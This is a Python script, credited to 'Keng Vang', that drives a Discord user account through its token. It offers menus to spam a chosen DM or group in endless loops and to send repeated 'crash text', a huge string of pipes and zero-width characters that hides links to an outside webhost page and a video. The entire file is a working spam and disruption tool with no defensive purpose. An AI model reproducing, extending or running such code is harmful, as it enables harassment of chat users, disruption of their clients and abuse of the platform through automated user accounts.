import requests
import time
from os import system, name
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
import concurrent.futures

#FUNCTIONS:
# Spam1
# Spam2
# Clear
# Chat
# Spammer
# Console
# Database
# Crash

# TOO DOO LIST
#   go search and find in the text: Fix this

crashtext="""
||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||https://ri0bl0x.000webhostapp.com/library/4967220670/Speed-Coil/
||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||https://cdn.discordapp.com/attachments/772258907161755649/776769427017695252/glizzy_dog.mp4
"""
#Title

commands=f"""
{Fore.YELLOW}1. enter token
{Fore.LIGHTBLUE_EX}2. SPAMMMERRRRR!!!
{Fore.MAGENTA}3. Chat From Terminal
{Fore.LIGHTRED_EX}4. save DM ID into database
{Fore.LIGHTGREEN_EX}5. spam crash a server or Dm
"""

title=f"""
{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{Fore.LIGHTGREEN_EX}
▓▓  ▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓    ▓▓▓▓▓▓
▓▓  ▓▓  ▓▓      ▓▓▓  ▓▓   ▓▓    ▓▓
▓▓ ▓▓   ▓▓      ▓▓ ▓ ▓▓  ▓▓    ▓▓▓▓
▓▓▓▓    ▓▓▓▓▓▓  ▓▓  ▓▓▓  ▓▓    
▓▓ ▓▓   ▓▓      ▓▓   ▓▓  ▓▓    ▓▓▓▓
▓▓  ▓▓  ▓▓      ▓▓   ▓▓  ▒▓▓     ▓▓ 
▓▓  ▓▓  ▓▓▓▓▓▓  ▓▓   ▓▓   ▒▓▓▓▓▓▓▓▒
▒▒▒▒▒▒  ▒▒▒▒▒▒  ▒▒   ▒▒    ▒▒▒▒▒▒▒░
░░ ░▒░  ░░ ░░▒   ░░▒░░ ░  ░ ░▒▒░░░
 ▒░░░    ░▒░░   ▒░ ░░░░   ░░░▒░░░
  ░          ░    ░         ░
 ░        ░          ░         ░
                 v0.04
{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""

arrow=f"{Fore.GREEN}>"

#Database
def Database():
    print(f'''
{title}

Options:
{Fore.YELLOW}1. Back
{Fore.LIGHTBLUE_EX}2. Save Another ID
{Fore.MAGENTA}3. Print all data base
{Fore.LIGHTRED_EX}4. Delete Line

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ''')
    #While loop
    while True:
        cmd=input("Enter Command:")
        if cmd == "1":
            clear()
            print(f'''
{title}

made by Keng Vang

COMMANDS:
{commands}

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

''')
            break
        #fix this plz
        elif cmd == "2":
            data_storage=input("Enter ID:")
            final_text=str(data_storage)+"\n"
            file=open("id.txt","a+")
            file.write(final_text)
            file.close()
        elif cmd == "3":
            file=open("id.txt","r")
            print(file.read())
            file.close()
        elif cmd == "4":
            #print lines
            file=open("id.txt","r")
            print(file.read())
            file.close()

            del_line=input("Enter Line to delete:")
            #read line
            file=open("id.txt","r")
            print(file.read())
            file.close()

            a_file = open("id.txt", "r")

            lines = a_file.readlines()
            a_file.close()

            new_file = open("id.txt", "w")
            for line in lines:
                if line.strip("\n") != del_line:
                    new_file.write(line)

            new_file.close()
            #print new text file
            print("New File:")
            file=open("id.txt","r")
            print(file.read())
            file.close()
        else:
            print("ERROR, please enter valid command.")




#Clear
def clear():
        system('cls')

clear()

#Spam1
r = requests.session()

def firedalaser(text,id):
    file = open("token.txt","r")
    token = file.read()

    payload = {
        'content': text
    }

    header = {
        'authorization': token
    }

    r.post('https://discord.com/api/v9/channels/'+str(id)+'/messages',data=payload, headers=header)

#Crash
def crash(id):
    file = open("token.txt","r")
    token = file.read()

    payload = {
        'content': crashtext
    }

    header = {
        'authorization': token
    }

    r.post('https://discord.com/api/v9/channels/'+str(id)+'/messages',data=payload, headers=header)

#Crash2
def crash2(id1):
    file = open("token.txt","r")
    token = file.read()

    payload = {
        'content': crashtext,
        'tts': 'false'
    }

    header = {
        'authorization': token
    }

    r.post('https://discord.com/api/v9/channels/'+str(id1)+'/messages',data=payload, headers=header)
    print(arrow,"Sending Requests")

#Chat
def chat():
    clear()
    print(f'''
{title}

SPAMMER OPTIONS

YOU ARE NOW CONNECTED

Options:
{Fore.YELLOW}1. Back
{Fore.LIGHTGREEN_EX}2. Change ID of DM

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ''')
    currentid=input("Enter the ID of the chat:")
    while True:
        cmd=input("Enter Text:")

        if cmd == "1":
            clear()
            file=open("id.txt","r")
            print(file.read())
            file.close()
            print(f'''
{title}

made by Keng Vang

COMMANDS:
{commands}

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

''')
            break
        elif cmd == "2":
            currentid=input("Enter new ID:")
        else:
            firedalaser(str(cmd),currentid)
                

#Spam2
def firedalaser2(text,id1):
    file = open("token.txt","r")
    token = file.read()

    payload = {
        'content': text,
        'tts': 'false'
    }

    header = {
        'authorization': token
    }

    r.post('https://discord.com/api/v9/channels/'+str(id1)+'/messages',data=payload, headers=header)
    print(arrow,"Sending Requests")


#Spammer
def spammer():
    clear()
    print(f'''
{title}

SPAMMER OPTIONS

Options:
{Fore.YELLOW}1. DM 
{Fore.LIGHTBLUE_EX}2. Group 
{Fore.MAGENTA}3. Back

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ''')
    while True:
        cmd = input("Enter Command:")
        if cmd == "3":
            clear()
            print(f'''
{title}

made by Keng Vang

COMMANDS:
{commands}


{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

''')
            break
        elif cmd == "1":
            file=open("id.txt","r")
            print(file.read())
            file.close()
            currentid=input("Input the ID of the DM:")
            currenttext=input("Input the text you wanna spam:")
            while True:
                firedalaser(currenttext,currentid)
                print(arrow,"Sending Requests")
        elif cmd == "2":
            print("This require 2 ID")
            currentid2=input("Input the ID(2) of the DM of the group:")
            currenttext=input("Input the text you wanna spam:")

            while True:
                firedalaser2(currenttext,currentid2)
                print(arrow,"Sending Requests")
        

def crasher():
    clear()
    print(f'''
{title}

CRASH OPTIONS

Options:
{Fore.YELLOW}1. DM 
{Fore.LIGHTBLUE_EX}2. Group 
{Fore.MAGENTA}3. Back

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ''')
    while True:
        cmd = input("Enter Command:")
        if cmd == "3":
            clear()
            print(f'''
{title}

made by Keng Vang

COMMANDS:
{commands}


{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

''')
            break
        elif cmd == "1":
            file=open("id.txt","r")
            print(file.read())
            file.close()
            currentid=input("Input the ID of the DM:")
            while True:
                for i in range(0,10):
                    crash(currentid)
                    print(arrow,"Sending Crash Text")
        elif cmd == "2":
            print("This require 2 ID")
            currentid2=input("Input the ID(2) of the DM of the group:")
            while True:
                for i in range(0,10):
                    crash2(currentid2)
                    print(arrow,"Sending Crash Text")


print(f'''
{title}

made by Keng Vang

COMMANDS:
{commands}

{Fore.WHITE}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

''')

#Console

while True:
    cmd = input("Enter Command:")
    if cmd == "1":
        file=open("token.txt","w")
        file.write(input("Enter your token:"))
        file.close()
    elif cmd == "2":
        clear()
        spammer()
    elif cmd == "3":
        clear()
        chat()
    elif cmd == "4":
        clear()
        Database()
    elif cmd=="5":
        clear()
        crasher()
        